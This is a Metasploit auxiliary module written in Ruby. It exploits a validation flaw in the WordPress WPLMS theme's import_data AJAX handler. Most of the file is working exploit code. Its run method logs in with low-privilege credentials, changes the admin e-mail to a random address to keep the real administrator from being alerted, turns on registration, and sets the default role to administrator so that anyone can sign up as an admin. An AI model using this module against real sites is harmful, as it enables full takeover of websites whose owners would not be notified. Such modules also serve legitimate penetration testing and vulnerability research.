##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress WPLMS Theme Privilege Escalation',
      'Description'     => %q{
          The WordPress WPLMS theme from version 1.5.2 to 1.8.4.1 allows an
          authenticated user of any user level to set any system option due to a lack of
          validation in the import_data function of /includes/func.php.

          The module first changes the admin e-mail address to prevent any
          notifications being sent to the actual administrator during the attack,
          re-enables user registration in case it has been disabled and sets the default
          role to be administrator.  This will allow for the user to create a new account
          with admin privileges via the default registration page found at
          /wp-login.php?action=register.
      },
      'Author'          =>
        [
          'Evex',                             # Vulnerability discovery
          'Rob Carr <rob[at]rastating.com>'   # Metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['WPVDB', '7785']
        ],
      'DisclosureDate'  => 'Feb 09 2015'
      ))

    register_options(
      [
        OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),
        OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])
      ])
  end

  def check
    check_theme_version_from_readme('wplms', '1.8.4.2', '1.5.2')
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def php_serialize(value)
    # Only strings and numbers are required by this module
    case value
    when String, Symbol
      "s:#{value.bytesize}:\"#{value}\";"
    when Integer
      "i:#{value};"
    end
  end

  def serialize_and_encode(value)
    serialized_value = php_serialize(value)
    unless serialized_value.nil?
      Rex::Text.encode_base64(serialized_value)
    end
  end

  def set_wp_option(name, value, cookie)
    encoded_value = serialize_and_encode(value)
    if encoded_value.nil?
      vprint_error("Failed to serialize #{value}.")
    else
      res = send_request_cgi(
        'method'    => 'POST',
        'uri'       => wordpress_url_admin_ajax,
        'vars_get'  => { 'action' => 'import_data' },
        'vars_post' => { 'name' => name, 'code' => encoded_value },
        'cookie'    => cookie
      )

      if res.nil?
        vprint_error("No response from the target.")
      else
        vprint_warning("Server responded with status code #{res.code}") if res.code != 200
      end

      return res
    end
  end

  def run
    print_status("Authenticating with WordPress using #{username}:#{password}...")
    cookie = wordpress_login(username, password)
    fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?
    store_valid_credential(user: username, private: password, proof: cookie)
    print_good("Authenticated with WordPress")

    new_email = "#{Rex::Text.rand_text_alpha(5)}@#{Rex::Text.rand_text_alpha(5)}.com"
    print_status("Changing admin e-mail address to #{new_email}...")
    if set_wp_option('admin_email', new_email, cookie).nil?
      fail_with(Failure::UnexpectedReply, 'Failed to change the admin e-mail address')
    end

    print_status("Enabling user registrations...")
    if set_wp_option('users_can_register', 1, cookie).nil?
      fail_with(Failure::UnexpectedReply, 'Failed to enable user registrations')
    end

    print_status("Setting the default user role...")
    if set_wp_option('default_role', 'administrator', cookie).nil?
      fail_with(Failure::UnexpectedReply, 'Failed to set the default user role')
    end

    register_url = normalize_uri(target_uri.path, 'wp-login.php?action=register')
    print_good("Privilege escalation complete")
    print_good("Create a new account at #{register_url} to gain admin access.")
  end
end
